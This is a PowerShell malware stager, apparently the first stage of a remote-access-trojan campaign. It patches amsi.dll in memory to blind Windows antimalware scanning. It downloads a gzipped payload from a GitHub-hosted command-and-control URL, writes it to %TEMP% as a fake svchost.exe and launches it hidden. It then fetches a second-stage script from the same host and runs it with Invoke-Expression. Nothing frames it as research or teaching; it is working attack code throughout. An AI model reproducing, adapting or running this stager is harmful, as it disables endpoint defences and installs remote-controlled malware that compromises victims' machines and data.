# stage1_amsi_bypass.ps1 (Fixed)
$C2_Base = "https://raw.githubusercontent.com/wolfgangphelan994924/window11/main"
$TempDir = $env:TEMP
$RAT_Path = Join-Path $TempDir "svchost.exe"
$Gz_Path = Join-Path $TempDir "upload.gz"
$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

# =============================
# 1. WIN32 P/INVOKE
# =============================
Add-Type -Namespace Win32 -Name NativeMethods -MemberDefinition @"
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")]
    public static extern bool FlushInstructionCache(IntPtr hProcess, IntPtr lpBaseAddress, UIntPtr dwSize);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();
"@

$PAGE_EXECUTE_READWRITE = 0x40
$MEM_COMMIT = 0x1000
$MEM_RESERVE = 0x2000
$PATCH_SIZE = 12 # MOV RAX, imm64 + JMP RAX

# =============================
# 2. AMSI BYPASS (Fixed)
# =============================
function Invoke-AMSI_Bypass {
    try {
        $amsi = [Win32.NativeMethods]::LoadLibrary("amsi.dll")
        if ($amsi -eq [IntPtr]::Zero) {
            Write-Verbose "Failed to load amsi.dll"
            return
        }

        $func = [Win32.NativeMethods]::GetProcAddress($amsi, "NdrClientCall3")
        if ($func -eq [IntPtr]::Zero) {
            Write-Verbose "Failed to get NdrClientCall3"
            return
        }

        # Allocate trampoline
        $trampoline = [Win32.NativeMethods]::VirtualAlloc([IntPtr]::Zero, [UIntPtr]::op_Explicit(0x1000), $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_EXECUTE_READWRITE)
        if ($trampoline -eq [IntPtr]::Zero) {
            Write-Verbose "Failed to allocate trampoline"
            return
        }

        # Write trampoline: XOR EAX, EAX; RET
        [System.Runtime.InteropServices.Marshal]::WriteByte($trampoline, 0, 0x31) # XOR
        [System.Runtime.InteropServices.Marshal]::WriteByte($trampoline, 1, 0xC0) # EAX
        [System.Runtime.InteropServices.Marshal]::WriteByte($trampoline, 2, 0xC3) # RET
        
        [Win32.NativeMethods]::FlushInstructionCache([Win32.NativeMethods]::GetCurrentProcess(), $trampoline, [UIntPtr]::op_Explicit(3)) | Out-Null

        # Patch NdrClientCall3
        $oldProtect = 0
        [Win32.NativeMethods]::VirtualProtect($func, [UIntPtr]::op_Explicit($PATCH_SIZE), $PAGE_EXECUTE_READWRITE, [ref]$oldProtect) | Out-Null

        # Build patch: MOV RAX, imm64 (10 bytes) + JMP RAX (2 bytes) = 12 bytes
        $trampAddr = $trampoline.ToInt64()
        $patch = [byte[]](0x48, 0xB8) + [BitConverter]::GetBytes($trampAddr) + [byte[]](0xFF, 0xE0)
        
        for ($i = 0; $i -lt $patch.Length; $i++) {
            [System.Runtime.InteropServices.Marshal]::WriteByte($func, $i, $patch[$i])
        }

        # Restore original protection
        [Win32.NativeMethods]::VirtualProtect($func, [UIntPtr]::op_Explicit($PATCH_SIZE), $oldProtect, [ref]$oldProtect) | Out-Null

        Write-Verbose "AMSI Bypass successful"
    } catch {
        Write-Verbose "AMSI Bypass failed: $_"
    }
}

# =============================
# 3. CHECK IF RAT ALREADY RUNNING
# =============================
function Test-RAT_Running {
    $RatName = "svchost.exe"
    $RatPath = Join-Path $env:TEMP $RatName
    
    # Get all svchost.exe processes
    $svchostProcesses = Get-Process -Name $RatName -ErrorAction SilentlyContinue
    
    # Filter: Only keep processes with matching path
    $ratProcess = $svchostProcesses | Where-Object {
        $_.Path -eq $RatPath -or 
        $_.Path -like "*\Users\Public\$RatName" -or 
        $_.Path -like "*\ProgramData\$RatName"
    }
    
    if ($ratProcess) {
        Write-Verbose "RAT already running (PID: $($ratProcess.Id)). Skipping deployment."
        return $true
    }
    
    Write-Verbose "RAT not running. Deploying..."
    return $false
}

# =============================
# 4. EXECUTE (Fixed GZIP handling)
# =============================
function Invoke-RAT_Deployment {
    # Check if already running
    if (Test-RAT_Running) { return }
    
    try {
        Write-Verbose "Downloading payload..."
        (New-Object Net.WebClient).DownloadFile("$C2_Base/upload.gz", $Gz_Path)
        
        Write-Verbose "Decompressing GZIP..."
        Add-Type -AssemblyName System.IO.Compression
        Add-Type -AssemblyName System.IO.Compression.FileSystem # Just in case
        
        $ms = [System.IO.MemoryStream]::new()
        $fs = [System.IO.File]::OpenRead($Gz_Path)
        $gzip = New-Object System.IO.Compression.GZipStream($fs, [System.IO.Compression.CompressionMode]::Decompress)
        $gzip.CopyTo($ms)
        $ms.Position = 0
        $bytes = $ms.ToArray()
        
        # Write directly to RAT_Path
        [System.IO.File]::WriteAllBytes($RAT_Path, $bytes)
        
        # Cleanup GZ
        Remove-Item $Gz_Path -Force
        
        Write-Verbose "Executing RAT..."
        Start-Process $RAT_Path -WindowStyle Hidden
        
        Write-Verbose "RAT deployed successfully."
    } catch {
        Write-Verbose "RAT deployment failed: $_"
    }
}

function Main {
    Start-Sleep -Seconds 2
    Invoke-AMSI_Bypass
    # Remove Invoke-EDR_Unhook as it was invalid
    Invoke-RAT_Deployment
}

Main
try {
    $stage2 = (New-Object Net.WebClient).DownloadString("$C2_Base/2.ps1")
    IEX $stage2
} catch {}